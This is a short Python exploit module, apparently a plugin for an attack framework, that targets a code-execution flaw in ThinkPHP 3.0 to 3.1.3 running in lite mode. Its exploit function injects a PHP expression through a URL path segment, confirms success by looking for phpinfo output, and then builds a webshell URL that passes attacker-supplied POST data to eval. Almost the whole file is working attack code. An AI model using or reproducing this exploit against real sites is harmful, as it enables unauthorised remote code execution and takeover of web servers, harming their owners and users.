#!/usr/bin/env python
# -*- coding:utf-8 -*-

from lib import logger
from lib import requests


author = "Chu <root@sh3ll.me>"
scope = "ThinkPHP 3.0,3.1.2,3.1.3"
description = "ThinkPHP 以 lite 模式启动时存在代码执行漏洞"
reference = "http://loudong.360.cn/vul/info/id/2919"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]


def exploit(URL):
    url = URL + "/index.php/Index/index/name/${@phpinfo()}"
    logger.process("Requesting target site")
    r = requests.get(url, timeout=5)
    r.close()
    if "<title>phpinfo()</title>" in r.text:
        logger.success("Exploitable!")
        logger.success("Phpinfo: %s" % url)
        url = url.replace("@phpinfo()", "@print(eval($_POST[chu]))")
        logger.success("Webshell: %s" % url)
        return url
